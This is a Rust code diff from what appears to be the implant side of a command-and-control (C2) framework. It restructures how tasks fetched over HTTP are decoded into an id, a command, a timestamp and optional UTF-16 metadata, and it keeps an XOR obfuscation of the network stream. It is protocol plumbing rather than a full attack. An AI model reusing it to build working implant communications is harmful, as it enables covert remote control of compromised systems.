@@ -14,22 +14,6 @@ pub trait XorEncode {
     fn xor_network_stream(self) -> Self;
 }
 
-pub trait CommandHeader {
-    fn from_command(cmd: Command) -> Self;
-}
-
-impl CommandHeader for Vec<u16> {
-    fn from_command(c: Command) -> Self {
-        let mut header = Self::new();
-
-        let (low, high) = c.to_u16_tuple_le();
-        header.push(low);
-        header.push(high);
-
-        header
-    }
-}
-
 impl XorEncode for Vec<u8> {
     fn xor_network_stream(mut self) -> Self {
         for b in &mut self {
@@ -66,34 +50,53 @@ pub fn decode_u8buf_to_u16buf(input: &[u8]) -> Vec<u16> {
 }
 
 pub fn decode_http_response(byte_response: &[u8]) -> Task {
-    let command_buf = &byte_response[..4];
-    let mut command_int: u32 = 0;
+    const COMMAND_INT_BYTE_SZ: usize = 4;
+    const TASK_ID_BYTE_SZ: usize = 4;
+    const TIMESTAMP_BYTE_SZ: usize = 8;
 
     //
-    // First we want to construct the command, we will first pull the u32 out of the message,
-    // and construct a `Command` from it.
+    // Pull out the task id (database ref)
     //
-    for (i, byte) in command_buf.iter().enumerate() {
-        command_int |= (*byte as u32) << (8 * i);
-    }
+    let task_id = i32::from_le_bytes([
+        byte_response[0],
+        byte_response[1],
+        byte_response[2],
+        byte_response[3],
+    ]);
 
+    //
+    // Pull out command
+    //
+    let command_int = u32::from_le_bytes([
+        byte_response[4],
+        byte_response[5],
+        byte_response[6],
+        byte_response[7],
+    ]);
     let command = Command::from_u32(command_int);
 
     //
-    // Now pull out the Task ID which we can send back to the  C2 in order to mark the task as
-    // completed in the database.
+    // Pull out timestamp of completed task
     //
-    let end = byte_response.len() - 4;
-    let id_bytes: &[u8] = &byte_response[end..];
-    let task_id = i32::from_le_bytes([id_bytes[0], id_bytes[1], id_bytes[2], id_bytes[3]]);
+    let timestamp = i64::from_le_bytes([
+        byte_response[8],
+        byte_response[9],
+        byte_response[10],
+        byte_response[11],
+        byte_response[12],
+        byte_response[13],
+        byte_response[14],
+        byte_response[15],
+    ]);
 
-    // Check if there was a message attached or not (> 8 bytes)
-    if byte_response.len() == 8 {
+    // Check if we have trailing metadata, if not - return the data as obtained thus far
+    let basic_packet_len = COMMAND_INT_BYTE_SZ + TIMESTAMP_BYTE_SZ + TASK_ID_BYTE_SZ;
+    if byte_response.len() == basic_packet_len {
         return Task {
             id: task_id,
             command,
             metadata: None,
-            completed_time: None,
+            completed_time: timestamp,
         };
     }
 
@@ -102,9 +105,7 @@ pub fn decode_http_response(byte_response: &[u8]) -> Task {
     // converting it to a utf-16 string.
     //
 
-    // Calculate the actual size of the message, -4 for the tail which contains the task ID
-    let message_sz = byte_response.len() - 4;
-    let message_bytes = &byte_response[4..message_sz];
+    let message_bytes = &byte_response[basic_packet_len..];
     let u16_bytes = decode_u8buf_to_u16buf(message_bytes);
     let task_metadata_string = String::from_utf16_lossy(&u16_bytes);
 
@@ -112,6 +113,6 @@ pub fn decode_http_response(byte_response: &[u8]) -> Task {
         id: task_id,
         command,
         metadata: Some(task_metadata_string),
-        completed_time: None,
+        completed_time: timestamp,
     }
 }
